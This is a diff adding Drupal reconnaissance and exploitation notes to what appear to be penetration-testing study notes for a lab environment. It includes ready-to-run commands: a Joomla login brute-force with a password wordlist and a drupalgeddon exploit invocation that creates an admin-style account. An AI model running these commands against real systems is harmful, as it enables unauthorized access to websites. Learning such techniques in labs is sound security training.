@@ -105,3 +105,28 @@ Brute forcing a login:
 sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/metasploit/http_default_pass.txt -usr admin
 ```
 
+# Drupal
+
+Basic footprinting of a drupal site:
+```
+curl -s http://drupal.inlanefreight.local | grep Drupal
+```
+
+Enumerating the version using changelog:
+```
+curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+```
+
+Automatic enumeration is possible with droopescan:
+```
+droopescan scan drupal -u http://drupal.inlanefreight.local
+```
+
+Most notable expoits are the three drupalgeddon exploits....
+```
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
+
+
+
+
